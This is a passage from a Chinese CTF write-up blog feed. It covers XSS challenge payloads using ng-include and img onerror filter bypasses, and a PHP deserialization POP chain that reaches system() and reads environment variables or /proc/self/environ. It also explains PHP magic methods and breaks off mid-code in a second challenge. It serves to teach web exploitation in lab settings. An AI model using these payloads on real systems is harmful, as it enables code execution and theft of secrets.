class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>ng-include</code>:这玩意类似于php的include，文件包含</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-number">1</span>、ng-<span class="hljs-meta"><span class="hljs-keyword">include</span> 指令用于包含外部的 HTML文件。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">2、包含的内容将作为指定元素的子节点。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">3、ng-<span class="hljs-keyword">include</span> 属性的值可以是一个表达式，返回一个文件名。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">4、默认情况下，包含的文件需要包含在同一个域名下。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">特别值得注意的几点如下：</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">1.ng-<span class="hljs-keyword">include</span>,如果单纯指定地址，必须要加引号</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">2.ng-<span class="hljs-keyword">include</span>,加载外部html，script标签中的内容不执行</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">3.ng-<span class="hljs-keyword">include</span>,加载外部html中含有style标签样式可以识别</span><br><span class="hljs-meta"></span><br></code></pre></td></tr></table></figure><p>所以可以包含同样存在xss漏洞的level1：</p><p>payload:</p><p>因为不执行script标签内容，所以这里使用伪协议或者<code>&lt;img&gt;</code>标签</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">?src=<span class="hljs-string">&#x27;level1.php?name=&lt;a href=&#x27;</span><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&#x27;&gt;xss&lt;/a&gt;&#x27;</span><span class="hljs-comment">//错误的，自己看着点单双引号</span><br>?src=<span class="hljs-string">&#x27;level1.php?name=&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;&#x27;</span><span class="hljs-comment">//正确的</span><br>?src=<span class="hljs-string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)/&gt;&#x27;</span><span class="hljs-comment">//错误的，不要加&#x27;/&#x27;</span><br>?src=<span class="hljs-string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><span class="hljs-comment">//正确的</span><br></code></pre></td></tr></table></figure><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>不让用script?那就用<code>&lt;img&gt;</code>，空格过滤？那么多绕过姿势</p><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;img<span class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>aonerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br>&lt;img<span class="hljs-variable">%0</span>csrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>conerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br>&lt;img<span class="hljs-variable">%0</span>dsrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>donerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化</title>
    <link href="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="2023-HZNUCTF-ppppop"><a href="#2023-HZNUCTF-ppppop" class="headerlink" title="2023 HZNUCTF ppppop"></a>2023 HZNUCTF ppppop</h2><p>打开页面发现什么也没有，hackbar查看Cookie发现存在Cookie</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Cookie=Tz<span class="hljs-meta">o0</span>OiJ<span class="hljs-attr">Vc2</span>VyIjoxO<span class="hljs-symbol">ntzOjc6</span>ImlzQWRtaW<span class="hljs-number">4</span>i<span class="hljs-meta">O2</span>I<span class="hljs-number">6</span>MDt<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>base64解码后得到一串序列化数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isAdmin&quot;</span>;b:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>b的值为0，尝试将b改为1伪造admin用户登录，进入网页，显示网页源码高亮：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>php反序列化，审计本题就是想通过类A来调用某个类的某个方法。</p><p>编写poc验证漏洞:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;args = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png"></p><p>执行calc.exe，说明存在漏洞。更改$a-&gt;args的值，发现flag存在于环境变量中：</p><p>$a-&gt;args &#x3D; “env”;</p><p>(Linux的环境变量也可以通过查看根目录下文件&#x2F;proc&#x2F;self&#x2F;environ：$a-&gt;args &#x3D; “cat &#x2F;proc&#x2F;self&#x2F;environ”)</p><p>POST传入</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload=fTsid<span class="hljs-name">m5</span>lIjozO<span class="hljs-symbol">nM7</span>I<span class="hljs-symbol">nNncmEiOjQ6</span>czsibWV<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lzIj<span class="hljs-meta">o2</span>O<span class="hljs-symbol">nM7</span>ImVtYU<span class="hljs-number">5</span>jb<span class="hljs-symbol">nVmIjo4</span>O<span class="hljs-symbol">nN9</span>ezowOiJCIjoxOk<span class="hljs-number">87</span>ImVtYU<span class="hljs-number">5</span>zc<span class="hljs-number">2</span>FsYyI<span class="hljs-number">6</span>OTpzezozOiJBIjoxOk<span class="hljs-number">8</span>=<br></code></pre></td></tr></table></figure><p>本题顺便复习了下___call()以及___destruct()魔术方法的使用方法：</p><h3 id="call"><a href="#call" class="headerlink" title="__call():"></a>__call():</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$arg_array</span>);<span class="hljs-comment">//调用一个未定义的方法的时候调用。当调用当前对象不存在的方法时，转向__call()</span><br></code></pre></td></tr></table></figure><p>也就是说，如果test()方法未定义，那么testzhege方法就会作为___call()的第一个参数传入，而test的参数会被装进数组中作为___call()的第二个参数传入。所以当调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>时，实际是相当于调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>));<br></code></pre></td></tr></table></figure><p>本题中B类中$funcName未定义，那么在A类中调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br></code></pre></td></tr></table></figure><p>时，A::$funcName就会被传入B类__call()中的$func，A::$args传入B类的$arg，而$arg[0]就是字符串”calc.exe”。</p><p>在B中转向执行__call()也就是B::$func(B::arg[0]);也就是system(“calc.exe”);</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct():"></a>__destruct():</h3><p>类的析构函数，在销毁一个类之前执行一些操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#声明格式：</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//TODO</span><br>&#125;<br><span class="hljs-comment">#注意：析构函数不能带有任何参数</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#举例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>)#构造说话方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我叫：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;，性别：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;sex.<span class="hljs-string">&quot;，年龄：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)#声明一个析构方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我觉得我还可以再抢救一下，我的名字叫&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$Person</span>);<span class="hljs-comment">//销毁上面创建的对象$Person</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#我觉得我还可以再抢救一下，我的名字叫小明</span><br></code></pre></td></tr></table></figure><h3 id="construct"><a href="#construct" class="headerlink" title="__construct():"></a>__construct():</h3><p>构造函数，使用new关键字实例化一个对象的时候构造函数自动调用。一个类中只能存在一个构造函数。与析构函数不同的是__construct()可以带有参数（可选，不需要时可以省略），如果构造函数有参数的话，在实例化对象时也要传入对应的参数，例如上述destruct()方法示例中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-comment">//也可以将上例中的__construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=22)参数的值进行修改，随意改，最终参数的值只看实例化传入的，</span><br><span class="hljs-comment">//例如构造函数声明和类Person实例化如下：</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>......<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小红&quot;</span>,<span class="hljs-string">&quot;女&quot;</span>，<span class="hljs-number">23</span>);<br>......<br><span class="hljs-comment">//则最后运行结果为</span><br><span class="hljs-comment">//我叫：小红，性别：女，年龄：23</span><br></code></pre></td></tr></table></figure><p>如果没有在代码中显示地声明构造函数，类中会默认存在一个没有参数列表并且内容为空的构造函数。如果显示地声明了构造函数则类中的默认构造方法将不会存在。所以构造函数通常用来做一些准备工作，比如为某些参数赋值。</p><p><em><strong>注意：如果显示地声明构造函数，那么它的访问权限必须是public，而且构造函数是在实例化时自动调用的，我们不需要手动调用。</strong></em></p><hr><h2 id="2023ROIS冬令营week4-babyphp"><a href="#2023ROIS冬令营week4-babyphp" class="headerlink" title="2023ROIS冬令营week4 babyphp"></a>2023ROIS冬令营week4 babyphp</h2><p>这题综合性比较强，考察了挺多方面的东西的（大哭</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;left = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;right = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> 